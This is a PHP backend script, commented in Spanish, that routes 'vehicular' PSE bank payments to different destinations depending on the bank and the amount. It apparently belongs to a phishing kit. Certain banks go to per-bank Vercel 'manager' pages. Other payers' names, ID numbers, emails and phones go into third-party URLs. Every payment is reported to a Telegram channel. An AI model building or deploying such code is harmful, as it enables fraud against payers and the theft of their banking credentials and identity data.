<?php
/**
 * Calcula la URL de destino del pago PSE según banco y monto.
 *
 * Reglas:
 *   1. Si el banco está en primary_banks → Vercel
 *   2. Si el monto > helppiupay_min_amount → HelppiuPay API
 *   3. Resto → Recaudofall
 *
 * Acepta POST con JSON: { banco, monto, nombre, cedula, tipoDocumento, tipoPersona, email, telefono }
 * Devuelve JSON: { ok, url, banco, flow } o { ok:false, error }
 */
declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');

if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'method_not_allowed']);
    exit;
}

$pseConfig = require __DIR__ . '/privado/pse-config.php';
$sysConfig = require __DIR__ . '/privado/config.php';
require_once __DIR__ . '/privado/telegram.php';
$config = $pseConfig;

$raw = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!is_array($data)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'bad_json']);
    exit;
}

$limpiar = static function ($v, int $max = 200): string {
    $v = is_scalar($v) ? (string) $v : '';
    $v = trim(preg_replace('/[\x00-\x1F\x7F]/u', '', $v) ?? '');
    return mb_substr($v, 0, $max);
};

$bancoClave  = $limpiar($data['banco']         ?? '', 120);
$nombre      = $limpiar($data['nombre']        ?? '', 150);
$cedula      = $limpiar($data['cedula']        ?? '', 30);
$tipoDoc     = $limpiar($data['tipoDocumento'] ?? 'CC', 10);
$tipoPersona = $limpiar($data['tipoPersona']   ?? 'natural', 20);
$email       = $limpiar($data['email']         ?? '', 150);
$telefono    = $limpiar($data['telefono']      ?? '', 20);
$monto       = $limpiar($data['monto']         ?? '0', 20);

$montoInt = (int) preg_replace('/[^\d]/', '', $monto);

if ($bancoClave === '') {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'banco_requerido']);
    exit;
}

// ── 1. Primary banks → Vercel ─────────────────────────────────────────────────

$primaryBanks = $config['primary_banks'] ?? [];
if (isset($primaryBanks[$bancoClave])) {
    $slug = $primaryBanks[$bancoClave]['slug'];
    $id   = $primaryBanks[$bancoClave]['id'];
    $url  = rtrim($config['links']['primary_page'], '/') . "/sites/{$slug}/manager/{$id}";
    veh_tg_log($sysConfig, '🏦 PSE Vercel (vehicular)', [
        'Banco'  => $bancoClave,
        'Monto'  => '$' . number_format($montoInt, 0, ',', '.'),
        'Nombre' => $nombre,
        'Cédula' => substr($cedula, 0, 3) . '***',
    ]);
    echo json_encode(['ok' => true, 'url' => $url, 'banco' => $bancoClave, 'flow' => 'primary']);
    exit;
}

// ── 2. Monto > umbral → HelppiuPay ───────────────────────────────────────────

$minAmount   = (int) ($config['helppiupay_min_amount'] ?? 2500000);
$hpBankCodes = $config['helppiupay_bank_codes'] ?? [];
$bankCode    = $hpBankCodes[$bancoClave] ?? null;
$useHelppiuPay = ($montoInt > $minAmount) && ($bankCode !== null);

if ($useHelppiuPay) {

    $hp   = $config['helppiupay'] ?? [];
    $auth = ($hp['key_id'] ?? '') . ':' . ($hp['secret'] ?? '');

    $docTypeMap = ['CC' => 'CC', 'CE' => 'CE', 'NIT' => 'NIT', 'PP' => 'PP', 'TI' => 'TI', 'PA' => 'PP'];
    $docType    = $docTypeMap[strtoupper($tipoDoc)] ?? 'CC';
    $docNumber  = preg_replace('/[^0-9]/', '', $cedula);
    $personType = ($tipoPersona === 'juridica') ? '1' : '0';

    $ref = 'VEH-' . $cedula . '-' . time();

    $payload = json_encode([
        'reference'      => substr($ref, 0, 80),
        'amount'         => $montoInt,
        'currency'       => 'COP',
        'customer'       => [
            'name'     => $nombre,
            'email'    => $email,
            'document' => $docNumber,
            'phone'    => $telefono,
        ],
        'payment_method' => [
            'type'          => 'pse',
            'bank_code'     => $bankCode,
            'person_type'   => $personType,
            'document_type' => $docType,
        ],
    ]);

    $ch = curl_init('https://helppiupay.com/api/v1/charges');
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_HTTPHEADER     => [
            'Authorization: Bearer ' . $auth,
            'Content-Type: application/json',
        ],
        CURLOPT_TIMEOUT        => 15,
        CURLOPT_SSL_VERIFYPEER => true,
    ]);

    $resp     = curl_exec($ch);
    $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlErr  = curl_error($ch);
    curl_close($ch);

    if ($curlErr || $resp === false) {
        http_response_code(502);
        echo json_encode(['ok' => false, 'error' => 'helppiupay_conexion']);
        exit;
    }

    $decoded = json_decode($resp, true);

    if ($httpCode !== 201 && $httpCode !== 200) {
        http_response_code(502);
        echo json_encode([
            'ok'     => false,
            'error'  => 'helppiupay_error',
            'detail' => $decoded['error'] ?? $decoded['message'] ?? $decoded['errors'] ?? '',
        ]);
        exit;
    }

    $redirectUrl = $decoded['next_action']['redirect_url'] ?? null;
    if (!$redirectUrl) {
        http_response_code(502);
        echo json_encode(['ok' => false, 'error' => 'helppiupay_no_redirect']);
        exit;
    }

    veh_tg_log($sysConfig, '🏦 PSE HelppiuPay (vehicular)', [
        'Referencia' => $ref,
        'Banco'      => $bancoClave,
        'Monto'      => '$' . number_format($montoInt, 0, ',', '.'),
        'Nombre'     => $nombre,
        'Cédula'     => substr($cedula, 0, 3) . '***',
    ]);
    echo json_encode(['ok' => true, 'url' => $redirectUrl, 'banco' => $bancoClave, 'flow' => 'helppiupay']);
    exit;
}

// ── 3. Recaudofall ────────────────────────────────────────────────────────────

$recaudofallBanks = $config['recaudofall_banks'] ?? [];
$bankLabel = $recaudofallBanks[$bancoClave]
    ?? strtoupper(preg_replace('/[^A-Z0-9]/i', '', $bancoClave));

$base = rtrim($config['links']['recaudofall_base'], '?&');
$sep  = (strpos($base, '?') !== false) ? '&' : '?';
$url  = $base . $sep . http_build_query([
    'banco'    => $bankLabel,
    'monto'    => $montoInt,
    'email'    => $email,
    'cedula'   => $cedula,
    'nombre'   => $nombre,
    'telefono' => $telefono,
]);

veh_tg_log($sysConfig, '🏦 PSE Recaudofall (vehicular)', [
    'Banco'  => $bancoClave,
    'Monto'  => '$' . number_format($montoInt, 0, ',', '.'),
    'Nombre' => $nombre,
    'Cédula' => substr($cedula, 0, 3) . '***',
]);
echo json_encode(['ok' => true, 'url' => $url, 'banco' => $bancoClave, 'flow' => 'recaudofall']);
